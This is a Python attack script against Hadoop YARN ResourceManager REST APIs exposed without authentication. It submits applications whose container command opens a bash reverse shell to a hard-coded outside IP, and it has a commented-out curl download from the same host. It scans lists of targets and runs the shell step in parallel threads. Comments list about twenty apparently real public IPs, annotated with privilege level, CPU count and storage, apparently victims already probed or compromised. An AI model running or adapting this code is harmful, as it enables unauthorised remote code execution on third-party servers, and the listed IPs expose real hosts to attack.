import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
import time
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path = Path(__file__).resolve().parent
result_path = file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:

        url = ip_+'/cluster'
        # print(index,url)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        print(res, len(res.text))
        print(index, ip_)
        with result_path.open('a+') as file:
            file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

def shell(url,index):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    }
    try:
        response = requests.post(url+"/ws/v1/cluster/apps/new-application",headers=headers,timeout=8)
        # print(response.json())
        id = response.json()["application-id"]
        # print(id)
        data = {
            'application-id': id,
            'application-name': 'mike',
            'am-container-spec': {
                'commands': {
                    # 'command': '/bin/bash -i >& /dev/tcp/%s/%s 0>&1'%(vps_ip,port)
                    'command': 'bash -c "bash -i >& /dev/tcp/39.101.76.53/3333 0>&1"'
                    # 'command': 'bash -c "bash -i >& /dev/tcp/54.238.137.0/3333 0>&1"'

                    # 'command': '/bin/bash -i >& /dev/tcp/39.101.76.53/3333 0>&1'
                    # 'command': 'curl http://39.101.76.53:8000/1.txt -o 1.txt'
                },
            },
            'application-type': 'YARN'}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            # 'Content-Type': 'application/json'
        }
        exploit = requests.post(url+"/ws/v1/cluster/apps",headers=headers,json=data)
        print(exploit)
        # print(exploit.headers)
        print(index,url)
        print("[+] 执行完成！")
        # with result_path.open('a+') as file:
            # file.write(url+line_break)
    except Exception as e:
        pass

url='http://59.45.163.126:18088'
# url='http://171.212.101.26:18088'
# url='http://13.239.11.205:8088'
# exploit(url)
shell(url,1)

threads = []
# with open(r'D:\Downloads\tmp\hadoop.txt', 'r') as file:
with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 147
        end = start+0

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            # print(index, ip)
            # exploit(ip,index)
            # time.sleep(1.2)
            # shell(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 25
# print(urls)
# http://18.223.132.139:8088  地权限
# http://35.226.208.255:8088  地权限
# http://165.227.110.173:8088  低权限   
# http://34.145.38.213:8088   低权限

# http://1.82.255.182:8088    nodemanager1
# http://34.237.242.179:8088 
# http://101.227.53.217:8088    c9va9sheg0str34t.novalocal

# http://13.239.11.205:8088    7ccfefd2fad2
# http://36.138.44.85:8088       506eeb90b9e2   低权限
# http://171.212.101.26:18088    node002    40几个T  CPU 48个
# http://20.212.116.206:8088   quickstart.cloudera   低权限 
# http://36.133.2.68:8089    slave1
# http://115.227.6.20:8088     低权限
# http://36.137.205.52:8088      node02
# http://101.227.53.217:8088    c9va9sheg0str34t.novalocal  
# http://65.109.226.45:8088   5fe807317feb
# http://182.42.137.153:8088   490947d237d0
# http://1.82.255.182:8088     nodemanager3
# http://59.45.163.126:18088    node001   CPU  128个 好几个T
# http://113.108.144.2:8074     localhost.localdomain
# http://101.132.27.207:8088 

test = 'tm'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(shell, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
